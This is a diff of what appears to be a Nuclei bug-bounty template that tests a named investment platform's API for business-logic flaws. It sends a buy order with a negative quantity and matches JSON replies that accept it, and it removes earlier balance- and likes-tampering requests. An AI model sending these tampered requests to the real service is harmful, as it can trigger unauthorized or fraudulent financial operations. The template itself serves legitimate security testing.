@@ -4,8 +4,8 @@ info:
   name: Tinkoff - Business Logic Flaws
   author: bugbounty
   severity: critical
-  description: Business logic flaws in investment and session handling
-  tags: business-logic,tinkoff
+  description: Business logic flaws in investment operations with negative values
+  tags: business-logic,payment,tinkoff
 
 http:
   - raw:
@@ -13,36 +13,9 @@ http:
         POST /api/invest/portfolio/instruments/v2 HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
+        Accept: application/json
 
         {"tickers":"AAPL","quantity":-1000,"action":"buy"}
-
-      - |
-        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {"tickers":"TSLA","quantity":0.00001,"action":"sell"}
-
-      - |
-        POST /api/invest-gw/social/v1/post HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {"likes":-999999,"views":99999999}
-
-      - |
-        POST /api/common/v1/session_info HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {"platform":"web","sessionid":"test","balance":999999999.99}
-
-      - |
-        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {"tickers":"BTC","price":0.01,"quantity":1000000}
 
     matchers-condition: and
     matchers:
@@ -50,12 +23,32 @@ http:
         status:
           - 200
           - 201
+          - 202
 
       - type: word
-        part: body
+        part: content_type
         words:
-          - "success"
-          - "approved"
-          - "completed"
-          - "accepted"
+          - "application/json"
+
+      - type: regex
+        part: body
+        regex:
+          - '"status"?\s*:\s*"?(success|completed|approved|accepted)"?'
+          - '"quantity"?\s*:\s*-\d+'
+          - '"result"?\s*:\s*"?ok"?'
         condition: or
+
+      - type: dsl
+        dsl:
+          - '!contains(body, "error")'
+          - '!contains(body, "invalid")'
+          - '!contains(body, "forbidden")'
+        condition: and
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.status'
+          - '.quantity'
+          - '.result'
